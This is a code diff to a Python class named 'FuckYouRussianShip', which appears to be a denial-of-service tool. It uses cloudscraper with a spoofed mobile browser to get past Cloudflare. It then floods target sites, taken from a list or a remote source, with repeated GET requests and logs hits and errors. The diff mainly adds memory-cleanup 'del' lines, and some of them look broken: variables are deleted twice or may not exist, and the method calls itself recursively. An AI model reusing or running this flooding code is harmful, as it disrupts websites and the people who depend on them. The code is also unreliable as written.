@@ -116,7 +116,8 @@ class FuckYouRussianShip:
                     exit()
             else:
                 sleep(5)
-                self.checkUpdate()
+                # self.checkUpdate()
+            del content
         except:
             sleep(5)
             self.checkUpdate()
@@ -124,7 +125,6 @@ class FuckYouRussianShip:
     def mainth(self):
         global threads_count
         threads_count += 1
-        result = 'processing'
         scraper = cloudscraper.create_scraper(
             browser={'browser': 'firefox', 'platform': 'android', 'mobile': True}, )
         scraper.headers.update(
@@ -161,6 +161,7 @@ class FuckYouRussianShip:
             else:
                 sleep(5)
                 continue
+            del content
 
             try:
                 site = unquote(choice(self.targets) if self.targets else data['site']['page'])
@@ -198,7 +199,8 @@ class FuckYouRussianShip:
                                 response = scraper.get(site, timeout=10)
                                 self.write_statistic_success(site, response.status_code)
                                 del response
-                else:                    
+                        del response
+                else:
                     for i in range(self.MAX_REQUESTS):
                         response = scraper.get(site, timeout=10)
                         self.write_statistic_success(site, response.status_code)
@@ -206,13 +208,21 @@ class FuckYouRussianShip:
                 #del attack
             except ConnectionError as exc:
                 self.write_statistic_error(site)
+                del exc
                 continue
             except Exception as exc:
                 self.write_statistic_error(site)
+                del exc
                 continue
             finally:
                 del attack
                 threads_count -= 1
+                del scraper
+                del host
+                del data
+                del site
+                del log_file_main
+                del log_file_name
                 return self.mainth()
 
     @staticmethod
